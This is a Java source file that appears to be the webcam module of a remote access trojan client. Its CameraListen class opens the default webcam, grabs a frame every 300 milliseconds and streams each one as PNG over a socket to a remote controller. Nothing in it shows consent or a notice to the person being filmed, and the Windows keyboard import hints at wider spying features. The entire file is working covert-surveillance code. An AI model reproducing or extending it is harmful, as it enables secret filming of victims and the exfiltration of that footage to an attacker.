package me.client.send;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.WebcamResolution;
import com.sun.jna.platform.win32.Win32VK;
import me.client.Client;
import me.client.utils.MessageFlags;
import me.client.utils.SendMessage;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.Socket;

public class CameraListen extends Thread{
    Socket socket;
    public volatile boolean run = false;
    public Webcam webcam;

    public CameraListen(Socket socket) {
        this.socket = socket;
    }
    public boolean open(){
        boolean success = false;
        try {
            webcam = Webcam.getDefault();
            webcam.open();
            success = true;
        }catch (Exception e) {
            SendMessage.SendHead(MessageFlags.CAMERA_ERROR,socket);
            success = false;
        }
        return success;
    }
    @Override
    public void run() {
        try {
            if(open()) {
            SendMessage.SendHead(MessageFlags.SHOW_CAMERA,socket);
            while (run) {
                Thread.sleep(300);
                BufferedImage bufferedImage = webcam.getImage();
                byte[] bytes = BufferedImageToByte(bufferedImage);
                SendMessage.Send(MessageFlags.UPDATE_CAMERA, bytes, socket);
            }
            }
        }catch (Exception e) {
            try {
                webcam.close();
            }catch (Exception e1) {
            }
        }
        }
        public byte[] BufferedImageToByte(BufferedImage image) throws IOException {
            ByteArrayOutputStream os = new ByteArrayOutputStream();
            ImageIO.write(image, "png", os);
            return os.toByteArray();
        }
        public void closeCamera() {
        run = false;
        webcam.close();
        }
}